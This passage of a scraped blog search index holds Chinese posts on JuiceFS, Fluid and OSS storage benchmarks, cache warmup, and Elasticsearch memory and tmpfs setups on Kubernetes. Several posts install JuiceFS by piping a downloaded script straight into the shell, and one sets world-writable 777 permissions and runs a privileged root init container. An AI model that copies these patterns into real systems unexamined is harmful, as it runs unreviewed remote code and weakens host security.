JuiceFS。\n演进之后能解决的问题\n各平台按照自己的冷热数据管理 JuiceFS 缓存 有利于解耦平台 解除内网专线的依赖，阿里云直接访问金山云的 JuiceFS 各平台根据云厂使用缓存服务，金山云用 Juicefs、OSS 用 Jindo 3.2 面向集中存储的研发工作流 面向集中存储的研发工作流，强调的是处于中间态的数据，应该集中存储和流转。\n研发工作流是一个中间态，具有以下特征:\n不用交付数据 不用交付模型 快速迭代 面向 JuiceFS 的研发工作流优势:\nJuiceFS 的速度有绝对优势 流转效率更高，避免频繁导数据 ","description":"","id":41,"section":"post","tags":["博文","AI","模型数据","研发流程"],"title":"模型研发过程中的存储系统建设思路","uri":"https://www.chenshaowen.com/blog/some-things-about-storage-system-in-model-development-process.html"},{"content":"1. 使用内存作为存储介质 如上图是存储金字塔，展示了存储介质价格与速度的关系。\n目前，企业之所以广泛采用磁带和磁盘作为存储介质，主要是因为它们的价格优势。市场价格受市场供需影响，即便是价格较高的存储介质，如果生产成本低廉，具有足够大的市场，生产过程中的良品率高，那么其市场价格也会降下来。\n市场的平衡点在于，存储介质能够满足消费者的需求，同时消费者愿意支付的价格能够覆盖生产成本。然而，这种平衡并非一蹴而就，产能的投入需要较长周期，而价格竞争却是瞬息万变，这种长短周期的不匹配导致了市场价格的波动。\n我们对存储介质的速度和容量的需求在不断增长，总是追求更快、更经济、更大容量的存储解决方案。这种需求的增长将推动市场平衡点的移动，催生新的需求，同时也促进了存储技术的创新与发展。\n将内存作为存储介质存在两大挑战：成本高昂和断电后数据丢失。\n价格的问题，要交给需求，如果需求端大爆发，内存作为存储介质的价格就会降下来。掉电易失，可以从软硬件层面解决。软件层面，可以通过冗余、纠删码重建等方式提高数据的可靠性；硬件层面有英特尔的傲腾作为先烈可以借鉴。当然，也可以不解决掉电易失的问题，掉电易失只是在传统场景下是缺点，如果在一个需要保密的场景下呢？掉电易失，可能成为一个很好的解决方案。寻找新的场景、高附加值的需求，也是一个不错的思路。\n基于以上考虑，我认为直接使用内存作为存储介质，在未来是一个可选的方案。​但这不意味着，会成为主流方案，而只是在某些场景下，会带来很大的便利或收益。\n2. 分布式的内存存储 如果仅仅只是在一台设备上创建一个存储区域，那么使用 tmpfs 就可以做到。\n因此，分布式、支持横向扩展是 MemoryFS 的一个必要的特性。\n如上图是 MemoryFS 的元数据与数据分离的存储架构。\n直接使用 Redis 存储元数据，其实是一个非常不错的选择。在使用 JuiceFS 社区版时，我首选也是使用 Redis 作为元数据存储，Redis 只需要 1GB 的内存就能够支持约 2TB 的数据存储。\n另外一种方案是，使用 RocksDB 和 Raft 实现一个分布式的元数据存储，这样会带来更加便捷的部署、更加可定制的存储方案。\n3. 支持 POSIX 协议 在 Linux 系统上，支持 POSIX 协议的存储能够挂载到文件系统中，提供远程访问能力，能够扩展应用场景。\n而常见的支持 POSIX 协议的方式是使用 Fuse，JuiceFS、SeaweedFS 也都是基于 Fuse 提供的 POSIX 协议。\n在 https://github.com/torvalds/linux/tree/master/fs 中可以看到一般的文件系统 ext4、btrfs 等都是内核中实现的。而 Fuse 提供了一种不用修改内核，就能实现自定义文件系统的方法。\n如上图，使用 Fuse 主要分为如下步骤:\n挂载到文件系统中。执行 ./hello /tmp/fuse, 将文件系统挂载到 /tmp/fuse 中。图中使用的是 libfuse 库，但其实也有其他语言库，比如 golang 的 https://github.com/hanwen/go-fuse。在 ./hello 程序中需要实现指定的接口，对接到外部的存储介质中。 使用文件系统。执行 ls /tmp/fuse，可以看到文件系统中的文件列表。在执行命令时，通过 libc 进行系统调用，经过内核中的 Fuse 模块转发给 hello 程序，然后 hello 程序响应 ls 命令对应的文件系统 API。 如上图，需要创建 MemoryFS Workers 组成的 Cluster 提供存储服务，使用时，通过一个本地 Fuse 程序挂载到当前目录即可。\n4. 总结 本篇主要是记录一些构想，将内存作为存储介质对外提供存储能力，主要内容如下:\n内存介质作为存储介质，在未来是一个可选的存储方案 分布式、支持横向扩展是 MemoryFS 的一个必要的特性 MemoryFS 需要支持 POSIX 协议，提供远程访问能力 ","description":"","id":42,"section":"post","tags":["博文","存储","内存","MemoryFS"],"title":"MemoryFS 存储系统的一些构想","uri":"https://www.chenshaowen.com/blog/something-about-memoryfs-storage-system.html"},{"content":"1. Jindo 直接加速 OSS 配置环境变量 1 2 3 4 export ENDPOINT=oss-cn-beijing-internal.aliyuncs.com export BUCKET= export AK= export SK= 创建凭证 1 2 3 4 5 6 7 8 9 10 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Secret metadata: name: myosssecret type: Opaque stringData: fs.oss.accessKeyId: ${AK} fs.oss.accessKeySecret: ${SK} EOF 创建 Dataset 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: myoss-jindo spec: mounts: - mountPoint: oss://${BUCKET}/test2/ options: fs.oss.endpoint: ${ENDPOINT} encryptOptions: - name: fs.oss.accessKeyId valueFrom: secretKeyRef: name: myosssecret key: fs.oss.accessKeyId - name: fs.oss.accessKeySecret valueFrom: secretKeyRef: name: myosssecret key: fs.oss.accessKeySecret accessModes: - ReadWriteMany EOF 创建 JindoRuntime 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: JindoRuntime metadata: name: myoss-jindo spec: replicas: 2 fuse: image: registry.cn-shanghai.aliyuncs.com/jindofs/jindo-fuse imageTag: 6.2.0 tieredstore: levels: - mediumtype: SSD path: /cache quota: 40960 low: \u0026#34;0.1\u0026#34; EOF 创建 Pod 负载 1 export IMAGE=shaowenchen/demo-ubuntu 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: myoss-jindo spec: containers: - name: demo image: ${IMAGE} volumeMounts: - mountPath: /data name: data volumes: - name: data persistentVolumeClaim: claimName: myoss-jindo EOF 1.1 juicefs 性能测试 1 2 3 4 5 6 7 8 9 10 11 12 juicefs bench --block-size 4096 --big-file-size 1024 --threads 30 ./ BlockSize: 4096 MiB, BigFileSize: 1024 MiB, SmallFileSize: 128 KiB, SmallFileCount: 100, NumThreads: 30 +------------------+---------------+-----------------+ | ITEM | VALUE | COST | +------------------+---------------+-----------------+ | Write big file | 1520.22 MiB/s | 20.21 s/file | | Read big file | 1595.94 MiB/s | 19.25 s/file | | Write small file | 8.9 files/s | 3373.29 ms/file | | Read small file | 289.1 files/s | 103.79 ms/file | | Stat file | 496.8 files/s | 60.39 ms/file | +------------------+---------------+-----------------+ 1.2 DD 性能测试 dd 写入，421 MB/s 1 2 3 4 5 6 7 time dd if=/dev/zero of=./dd.txt bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 24.8855 s, 421 MB/s real\t0m25.047s user\t0m0.004s sys\t0m2.857s dd 首次读，485 MB/s 1 2 3 4 5 6 7 time dd if=./dd.txt of=/dev/null bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 21.6259 s, 485 MB/s real\t0m21.683s user\t0m0.000s sys\t0m1.451s dd 第二次读，533 MB/s 1 2 3 4 5 6 7 time dd if=./dd.txt of=/dev/null bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 19.6688 s, 533 MB/s real\t0m19.692s user\t0m0.004s sys\t0m1.284s 1.3 清理资源 1 2 3 4 kubectl delete pod myoss-jindo kubectl delete jindoruntimes myoss-jindo kubectl delete dataset myoss-jindo kubectl delete secret myosssecret 2. JuiceFS 社区版对接 OSS 2.1 配置环境变量 1 2 3 4 5 6 7 8 9 10 11 export REDIS_IP=x.x.x.x export REDIS_PORT=6379 export REDIS_USER=default export REDIS_PASSWORD=mypassword export REDIS_DIRECTSERVER=redis://${REDIS_USER}:${REDIS_PASSWORD}@${REDIS_IP}:${REDIS_PORT}/1 export ACCESS_KEY=xxx export SECRET_KEY=xxx export BUCKET=xxx export ENDPOINT=oss-cn-beijing-internal.aliyuncs.com export BUCKET_ENPOINT=$BUCKET.$ENDPOINT 2.2 初始化文件系统 安装 JuiceFS 1 curl -sSL https://d.juicefs.com/install | sh - 初始化文件系统 1 2 3 4 5 juicefs format \\ --storage oss \\ --bucket ${BUCKET_ENPOINT}\\ ${REDIS_DIRECTSERVER} \\ oss-direct 3. 主机直接挂载 JuiceFS 3.1 juicefs 性能测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 juicefs mount -d --buffer-size 2000 --max-uploads 150 ${REDIS_DIRECTSERVER} ./oss-direct --cache-dir=/data/jfs-oss-direct +------------------+-------------------+---------------+ | ITEM | VALUE | COST | +------------------+-------------------+---------------+ | Write big file | 2348.54 MiB/s | 13.08 s/file | | Read big file | 5988.49 MiB/s | 5.13 s/file | | Write small file | 867.1 files/s | 34.60 ms/file | | Read small file | 35705.2 files/s | 0.84 ms/file | | Stat file | 103844.2 files/s | 0.29 ms/file | | FUSE operation | 534217 operations | 0.91 ms/op | | Update meta | 9543 operations | 0.10 ms/op | | Put object | 10680 operations | 154.07 ms/op | | Get object | 7680 operations | 71.21 ms/op | | Delete object | 0 operations | 0.00 ms/op | | Write into cache | 4314 operations | 1.10 ms/op | | Read from cache | 3000 operations | 0.16 ms/op | +------------------+-------------------+---------------+ 3.2 DD 性能测试 dd 写入，1.7 GB/s 1 2 3 4 5 6 7 time dd if=/dev/zero of=./dd.txt bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 5.99897 s, 1.7 GB/s real\t0m6.001s user\t0m0.004s sys\t0m3.112s dd 首次读，369 MB/s 1 2 3 4 5 6 7 time dd if=./dd.txt of=/dev/null bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 28.4491 s, 369 MB/s real\t0m29.033s user\t0m0.000s sys\t0m3.808s dd 第二次读，6.3 GB/s 1 2 3 4 5 6 7 time dd if=./dd.txt of=/dev/null bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 1.65887 s, 6.3 GB/s real\t0m1.660s user\t0m0.000s sys\t0m1.659s 4. Pod 挂载 JuiceFS 4.1 创建测试负载 创建秘钥 1 2 3 4 5 6 7 8 9 10 11 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Secret metadata: name: juicefs-direct-secret type: Opaque stringData: metaurl: redis://${REDIS_USER}:${REDIS_PASSWORD}@${REDIS_IP}:6379/1 access-key: ${ACCESS_KEY} secret-key: ${SECRET_KEY} EOF 创建 Dataset 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: Dataset metadata: name: juicefs-direct-demo spec: accessModes: - ReadWriteMany mounts: - name: oss-direct mountPoint: \u0026#34;juicefs:///\u0026#34; options: bucket: ${BUCKET_ENPOINT} storage: oss encryptOptions: - name: metaurl valueFrom: secretKeyRef: name: juicefs-direct-secret key: metaurl - name: access-key valueFrom: secretKeyRef: name: juicefs-direct-secret key: access-key - name: secret-key valueFrom: secretKeyRef: name: juicefs-direct-secret key: secret-key EOF 需要注意这里的 name 需要和 format 中的 name 保持一致。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: data.fluid.io/v1alpha1 kind: JuiceFSRuntime metadata: name: juicefs-direct-demo spec: replicas: 1 tieredstore: levels: - mediumtype: SSD path: /cache quota: 40960 low: \u0026#34;0.1\u0026#34; EOF 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: juicefs-direct-demo spec: containers: - name: demo image: shaowenchen/demo-ubuntu volumeMounts: - mountPath: /data/jfs name: data volumes: - name: data persistentVolumeClaim: claimName: juicefs-direct-demo EOF 4.2 juicefs 性能测试 进入 Pod 并执行 curl -sSL https://d.juicefs.com/install | sh - 安装 JuiceFS 客户端。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 juicefs bench --block-size 4096 --big-file-size 1024 --threads 30 ./ +------------------+-------------------+---------------+ | ITEM | VALUE | COST | +------------------+-------------------+---------------+ | Write big file | 754.37 MiB/s | 40.72 s/file | | Read big file | 1808.45 MiB/s | 16.99 s/file | | Write small file | 628.6 files/s | 47.72 ms/file | | Read small file | 1129.1 files/s | 26.57 ms/file | | Stat file | 120037.9 files/s | 0.25 ms/file | | FUSE operation | 536005 operations | 3.39 ms/op | | Update meta | 9547 operations | 0.32 ms/op | | Put object | 10680 operations | 80.47 ms/op | | Get object | 15152 operations | 50.53 ms/op | | Delete object | 0 operations | 0.00 ms/op | | Write into cache | 0 operations | 0.00 ms/op | | Read from cache | 0 operations | 0.00 ms/op | +------------------+-------------------+---------------+ 4.3 DD 性能测试 dd 写入，794 MB/s 1 2 3 4 5 6 7 time dd if=/dev/zero of=./dd.txt bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 13.198 s, 794 MB/s real\t0m13.199s user\t0m0.004s sys\t0m2.860s dd 首次读，301 MB/s 1 2 3 4 5 6 7 time dd if=./dd.txt of=/dev/null bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 34.8118 s, 301 MB/s real\t0m35.162s user\t0m0.004s sys\t0m3.222s dd 第二次读，7.0 GB/s 1 2 3 4 5 6 7 time dd if=./dd.txt of=/dev/null bs=4M count=2500 10485760000 bytes (10 GB, 9.8 GiB) copied, 1.48848 s, 7.0 GB/s real\t0m1.490s user\t0m0.000s sys\t0m1.489s 5. 总结 JuiceFS 性能测试结果如下 测试场景 写入大文件速度 读取大文件速度 写入小文件速度 读取小文件速度 使用 Jindo 加速 OSS 1520.22 MiB/s 1595.94 MiB/s 8.9 files/s 289.1 files/s 主机上 JuiceFS + OSS 2348.54 MiB/s 5988.49 MiB/s 867.1 files/s 35705.2 files/s Pod 上 JuiceFS + OSS 754.37 MiB/s 1808.45 MiB/s 628.6 files/s 1129.1 files/s DD 性能测试结果如下 测试场景 写入速度 首次读取速度 第二次读取速度 使用 Jindo 加速 OSS 421 MB/s 485 MB/s 533 MB/s 主机上 JuiceFS + OSS 1.7 GB/s 369 MB/s 6.3 GB/s Pod 上 JuiceFS + OSS 794 MB/s 301 MB/s 7.0 GB/s 基于以上的测试结果，在阿里云上直接使用 JindoRuntime 将 OSS 以 PVC 挂载到 Pod 中使用即可满足模型推理需求。\n使用 Fluid 直接加速对象存储的方式，用于推理时模型的加载，是非常推荐的一种方式。不仅免去部署 JuiceFS 的元数据存储服务，还能够实现 PVC 与 OSS 之间的双向同步，在运维上提供了极大便利。\n","description":"","id":43,"section":"post","tags":["博文","OSS","Fluid","JuiceFS","AI","Data"],"title":"使用 Fluid 对接 OSS 存储及性能测试","uri":"https://www.chenshaowen.com/blog/using-fluid-to-access-oss-storage-and-performance-testing.html"},{"content":"1. 关于 JuiceFS 的缓存 在主机上，预热的缓存是直接放在主机上的。\n在集群中，分为两级缓存:\nWorker，提供集群级别共享的缓存 Fuse，提供仅当前节点级别的缓存 2. 使用 JuiceFS 客户端预热数据 需要注意的是在 Fuse 层预热，仅对当前节点有效，如果需要预热整个集群，需要在 Worker 层预热。\n指定目录 1 juicefs warmup /mnt/jfs/dataset-1 批量指定目录 1 juicefs warmup -f warm.txt 其中 warm.txt 为预热目录列表，每行一个目录\n1 2 3 /mnt/jfs/dataset-1 /mnt/jfs/dataset-2 /mnt/jfs/pics 3. 使用 Fluid 预热数据 预热指定的目录 1 2 3 4 5 6 7 8 9 10 11 12 13 14 apiVersion: data.fluid.io/v1alpha1 kind: DataLoad metadata: name: juicefs-dataload spec: dataset: name: my-dataset namespace: default options: timeout: 120m target: - path: /jfs/dataset-1 - path: /jfs/dataset-2 - path: /jfs/pics 默认的超时时间为 20 分钟，但由于预热时没有配置并发 -c 200，导致预热速度很慢，因此设置为 120 分钟。\n如果需要修改并发，可以修改同命名空间下 *-loader-data-load-script 脚本中的预热命令，然后直接 kill Pod 即可。\n预热整个数据集 1 2 3 4 5 6 7 8 9 10 cat \u0026lt;\u0026lt;EOF \u0026gt; dataload.yaml apiVersion: data.fluid.io/v1alpha1 kind: DataLoad metadata: name: juicefs-dataload spec: dataset: name: juicefs namespace: default EOF 4. 挂载 PVC 预热数据 创建 Pod 挂载 PVC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 export NAMESPACE= export PVC_NAME= export DEMO_IMAGE= export NODE_NAME= kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: Pod metadata: name: $PVC_NAME namespace: $NODE_NAME spec: nodeName: $HOSTNAME containers: - name: demo image: $DEMO_IMAGE volumeMounts: - mountPath: /data/jfs name: data volumes: - name: data persistentVolumeClaim: claimName: $PVC_NAME EOF 进入 Pod 1 2 3 kubectl -n $NAMESPACE get pod $PVC_NAME kubectl -n $NAMESPACE exec -it $PVC_NAME -- bash 预热数据 需要注意，如果使用的是企业版就用企业版的 JuiceFS 客户端，如果是社区版就用社区版的。这里以社区版为例:\n1 curl -sSL https://d.juicefs.com/install | sh - 预热命令和上面一样\n1 juicefs warmup /data/jfs/dataset-1 ","description":"","id":44,"section":"post","tags":["博文","Fluid","JuiceFS","AI","Data"],"title":"如何预热 Juicefs 数据","uri":"https://www.chenshaowen.com/blog/how-to-warmup-juicefs-data.html"},{"content":"1. 现象 基于 Kubernetes 的 Elasticsearch 频繁重启，导致服务几乎不可用。\n在导入数据过程中，Pod 的内存使用持续增长 Pod 内存使用接近 Limit 之后，继续导入就会触发 Pod 异常退出，错误日志 ERROR: Elasticsearch exited unexpectedly Pod 内存使用率并不会下降，而是维持在 Limit 附近，不久又异常退出 Elasticsearch Pod 内存限制在 64GB，而 JVM 内存限制是 32GB。\n2. 查看运行环境 由于 Elasticsearch Pod 频繁出现 Crash、OOMkilled 状态，我对运行环境进行了一次检测。\n集群及内核版本 1 2 3 kubectl get nodes -o wide ascend-910b-1 Ready node 11d v1.25.6 x.x.x.x \u0026lt;none\u0026gt; Ubuntu 22.04.2 LTS 5.15.0-60-generic docker://20.10.7 系统内核版本、集群版本都挺高。\n查看节点负载 1 2 3 4 5 6 7 8 9 kubectl top node NAME CPU(cores) CPU% MEMORY(bytes) MEMORY% ascend-910b-01 19964m 11% 592344Mi 28% ascend-910b-02 12921m 7% 273261Mi 13% ascend-910b-03 16192m 9% 767870Mi 37% ascend-910b-04 15930m 9% 615426Mi 29% ascend-910b-05 13048m 7% 278558Mi 13% ascend-910b-06 13258m 7% 637063Mi 30% 每个节点的 CPU、内存使用率都很低，没有超过 50%。每个节点都配备有 176C 处理核心、2.0TB 内存。\n节点内存使用 1 2 3 4 free -h total used free shared buff/cache available Mem: 2.0Ti 232Gi 13Gi 52Gi 1.7Ti 1.7Ti Swap: 0B 0B 0B 大量的 Cache 使用引起了我的注意。\n3. 原因 容器 Memory OOM 的触发指标是 container_memory_working_set_bytes，其实际组成为 RSS + Cache。\nRSS 是指进程当前在物理内存中所占用的空间大小，包括代码、数据和堆栈等。\nCache 是指操作系统用于缓存最近访问过的文件数据的一部分内存。这些数据通常是从磁盘读取的文件内容，被缓存在物理内存中系统中的 Cache 高时，表示系统中有大量的内存被用于缓存最近访问过的文件数据，即大量 IO 操作带来的 Cache 压力。\n从上面的监控可以看到 Elasticsearch 的 RSS 使用量一直维持在 32GB，只能是 Cache 不断在增长了。\n接着不设置 Limit 观测 Elasticsearch Pod 内存使用情况。\n如上图，一直导入数据，Pod 的 Page Cache 使用量持续增长。\n如上图，直到导入数据停止之后，Page Cache 的使用量不再增长，但也并没有立即释放。\n4. 解决方案 清理 Cache 是一个解决方案。但无法按照应用的维度来清理 Cache，在主机上清理全部 Cache 会影响其他应用; 同时，从上面的 free 命令输出，可以看到 Cache 太大了，执行 sync \u0026amp;\u0026amp; echo 3 \u0026gt; /proc/sys/vm/drop_caches 需要等待很长时间。\n另外一个不直接清理 Cache 的原因是，集群上运行的是训练任务，如果训练任务使用了相同的数据集，清理 Cache 会导致缓存失效，增加了训练时间。\n只能重启应用了:\n如上图是重启应用之后的内存使用监控，Cache 缓存被释放掉。\n这里需要关注的是，怎么样重启应用，有三种方式：\nDelete Pod Restart StatefulSet ECK Operator Restart 这里推荐修改 ECK 的 Request 配置值来触发重启应用，其他方式容易导致新 Pod 被识别为新的 Elasticsearch Node 触发索引重建。具体什么情况触发、什么情况能够直接复用，我还不能确定。\n","description":"","id":45,"section":"post","tags":["博文","IO","Kuberentes","Elasticsearch"],"title":"高频 IO 的 POD 并不适合设置 Limit","uri":"https://www.chenshaowen.com/blog/high-frequency-io-pod-not-suitable-for-setting-limit.html"},{"content":"1. 在主机上挂载内存存储目录 创建目录用于挂载 1 mkdir /mnt/memory_storage 挂载 tmpfs 文件系统 1 mount -t tmpfs -o size=800G tmpfs /mnt/memory_storage 存储空间会按需使用，也就是使用 100G 存储时才会占用 100G 内存。主机节点上有 2T 内存，这里分配 800G 内存用于存储 Elasticsearch 数据。\n提前创建好目录 1 2 3 mkdir /mnt/memory_storage/elasticsearch-data-es-jfs-prod-es-default-0 mkdir /mnt/memory_storage/elasticsearch-data-es-jfs-prod-es-default-1 mkdir /mnt/memory_storage/elasticsearch-data-es-jfs-prod-es-default-2 如果没有提前创建好目录，并赋予读写权限，会导致 Elasticsearch 组件起不来，提示多个节点使用了相同的数据目录。\n配置目录权限 1 chmod -R 777 /mnt/memory_storage DD 测试 IO 带宽 1 2 3 4 5 dd if=/dev/zero of=/mnt/memory_storage/dd.txt bs=4M count=2500 2500+0 records in 2500+0 records out 10485760000 bytes (10 GB, 9.8 GiB) copied, 3.53769 s, 3.0 GB/s 清理文件\n1 rm -rf /mnt/memory_storage/dd.txt FIO 测试 IO 带宽 1 2 3 4 fio --name=test --filename=/mnt/memory_storage/fio_test_file --size=10G --rw=write --bs=4M --numjobs=1 --runtime=60 --time_based Run status group 0 (all jobs): WRITE: bw=2942MiB/s (3085MB/s), 2942MiB/s-2942MiB/s (3085MB/s-3085MB/s), io=172GiB (185GB), run=60001-60001msec 清理文件\n1 rm -rf /mnt/memory_storage/fio_test_file 测试内存 IO 带宽 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 mbw 10000 Long uses 8 bytes. Allocating 2*1310720000 elements = 20971520000 bytes of memory. Using 262144 bytes as blocks for memcpy block copy test. Getting down to business... Doing 10 runs per test. 0\tMethod: MEMCPY\tElapsed: 1.62143\tMiB: 10000.00000\tCopy: 6167.380 MiB/s 1\tMethod: MEMCPY\tElapsed: 1.63542\tMiB: 10000.00000\tCopy: 6114.656 MiB/s 2\tMethod: MEMCPY\tElapsed: 1.63345\tMiB: 10000.00000\tCopy: 6121.997 MiB/s 3\tMethod: MEMCPY\tElapsed: 1.63715\tMiB: 10000.00000\tCopy: 6108.161 MiB/s 4\tMethod: MEMCPY\tElapsed: 1.64429\tMiB: 10000.00000\tCopy: 6081.667 MiB/s 5\tMethod: MEMCPY\tElapsed: 1.62772\tMiB: 10000.00000\tCopy: 6143.574 MiB/s 6\tMethod: MEMCPY\tElapsed: 1.60684\tMiB: 10000.00000\tCopy: 6223.379 MiB/s 7\tMethod: MEMCPY\tElapsed: 1.62499\tMiB: 10000.00000\tCopy: 6153.876 MiB/s 8\tMethod: MEMCPY\tElapsed: 1.63967\tMiB: 10000.00000\tCopy: 6098.770 MiB/s 9\tMethod: MEMCPY\tElapsed: 2.97213\tMiB: 10000.00000\tCopy: 3364.588 MiB/s AVG\tMethod: MEMCPY\tElapsed: 1.76431\tMiB: 10000.00000\tCopy: 5667.937 MiB/s 0\tMethod: DUMB\tElapsed: 1.01521\tMiB: 10000.00000\tCopy: 9850.140 MiB/s 1\tMethod: DUMB\tElapsed: 0.85378\tMiB: 10000.00000\tCopy: 11712.605 MiB/s 2\tMethod: DUMB\tElapsed: 0.82487\tMiB: 10000.00000\tCopy: 12123.167 MiB/s 3\tMethod: DUMB\tElapsed: 0.84520\tMiB: 10000.00000\tCopy: 11831.463 MiB/s 4\tMethod: DUMB\tElapsed: 0.83050\tMiB: 10000.00000\tCopy: 12040.968 MiB/s 5\tMethod: DUMB\tElapsed: 0.84932\tMiB: 10000.00000\tCopy: 11774.194 MiB/s 6\tMethod: DUMB\tElapsed: 0.82491\tMiB: 10000.00000\tCopy: 12122.505 MiB/s 7\tMethod: DUMB\tElapsed: 1.44235\tMiB: 10000.00000\tCopy: 6933.144 MiB/s 8\tMethod: DUMB\tElapsed: 2.68656\tMiB: 10000.00000\tCopy: 3722.225 MiB/s 9\tMethod: DUMB\tElapsed: 8.44667\tMiB: 10000.00000\tCopy: 1183.898 MiB/s AVG\tMethod: DUMB\tElapsed: 1.86194\tMiB: 10000.00000\tCopy: 5370.750 MiB/s 0\tMethod: MCBLOCK\tElapsed: 4.52486\tMiB: 10000.00000\tCopy: 2210.013 MiB/s 1\tMethod: MCBLOCK\tElapsed: 4.82467\tMiB: 10000.00000\tCopy: 2072.683 MiB/s 2\tMethod: MCBLOCK\tElapsed: 0.84797\tMiB: 10000.00000\tCopy: 11792.870 MiB/s 3\tMethod: MCBLOCK\tElapsed: 0.84980\tMiB: 10000.00000\tCopy: 11767.516 MiB/s 4\tMethod: MCBLOCK\tElapsed: 0.87665\tMiB: 10000.00000\tCopy: 11407.113 MiB/s 5\tMethod: MCBLOCK\tElapsed: 0.85952\tMiB: 10000.00000\tCopy: 11634.468 MiB/s 6\tMethod: MCBLOCK\tElapsed: 0.84132\tMiB: 10000.00000\tCopy: 11886.154 MiB/s 7\tMethod: MCBLOCK\tElapsed: 0.84970\tMiB: 10000.00000\tCopy: 11768.915 MiB/s 8\tMethod: MCBLOCK\tElapsed: 0.86918\tMiB: 10000.00000\tCopy: 11505.150 MiB/s 9\tMethod: MCBLOCK\tElapsed: 0.85996\tMiB: 10000.00000\tCopy: 11628.434 MiB/s AVG\tMethod: MCBLOCK\tElapsed: 1.62036\tMiB: 10000.00000\tCopy: 6171.467 MiB/s 看起来将内存挂载为文件系统的 IO 带宽只能达到内存的 IO 带宽的一半。\n2. 在 Kubernetes 集群上创建 PVC 配置环境变量 1 2 export NAMESPACE=data-center export PVC_NAME=elasticsearch-data-es-jfs-prod-es-default-0 创建 PV 及 PVC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 kubectl create -f - \u0026lt;\u0026lt;EOF apiVersion: v1 kind: PersistentVolume metadata: name: ${PVC_NAME} namespace: ${NAMESPACE} spec: accessModes: - ReadWriteMany capacity: storage: 800Gi hostPath: path: /mnt/memory_storage/${PVC_NAME} --- apiVersion: v1 kind: PersistentVolumeClaim metadata: name: ${PVC_NAME} namespace: ${NAMESPACE} spec: accessModes: - ReadWriteMany resources: requests: storage: 800Gi EOF 通过修改 PVC_NAME 变量创建至少 3 个 PVC 应用，最终我创建了 10 个 PVC，总共提供了 15+ TB 的存储 ​。\n3. 部署 Elasticsearch 相关组件 此处省略了部分内容，详情参考 使用 JuiceFS 存储 Elasticsearch 数据。\n部署 Elasticsearch 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: namespace: $NAMESPACE name: es-jfs-prod spec: version: 8.12.0 image: hubimage/elasticsearch:8.12.0 http: tls: selfSignedCertificate: disabled: true nodeSets: - name: default count: 3 config: node.store.allow_mmap: false index.store.type: niofs podTemplate: spec: nodeSelector: servertype: Ascend910B-24 initContainers: - name: sysctl securityContext: privileged: true runAsUser: 0 command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;sysctl -w vm.max_map_count=262144\u0026#39;] - name: install-plugins command: - sh - -c - | bin/elasticsearch-plugin install --batch https://get.infini.cloud/elasticsearch/analysis-ik/8.12.0 \u0026amp;\u0026amp; bin/elasticsearch-plugin install --batch repository-s3 \u0026amp;\u0026amp; bin/elasticsearch-plugin install --batch analysis-icu \u0026amp;\u0026amp; echo xxx | bin/elasticsearch-keystore add --stdin --force s3.client.default.secret_key \u0026amp;\u0026amp; echo xxx | bin/elasticsearch-keystore add --stdin --force s3.client.default.access_key securityContext: runAsUser: 0 runAsGroup: 0 containers: - name: elasticsearch readinessProbe: exec: command: - bash - -c - /mnt/elastic-internal/scripts/readiness-probe-script.sh failureThreshold: 10 initialDelaySeconds: 30 periodSeconds: 30 successThreshold: 1 timeoutSeconds: 30 env: - name: \u0026#34;ES_JAVA_OPTS\u0026#34; value: \u0026#34;-Xms31g -Xmx31g\u0026#34; - name: \u0026#34;NSS_SDB_USE_CACHE\u0026#34; value: \u0026#34;no\u0026#34; resources: requests: cpu: 8 memory: 64Gi EOF 查看 Elasticsearch 密码 1 2 3 kubectl -n $NAMESPACE get secret es-jfs-prod-es-elastic-user -o go-template=\u0026#39;{{.data.elastic | base64decode}}\u0026#39; xxx 默认用户名是 elastic\n部署 Metricbeat 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 kubectl apply -f - \u0026lt;\u0026lt;EOF apiVersion: 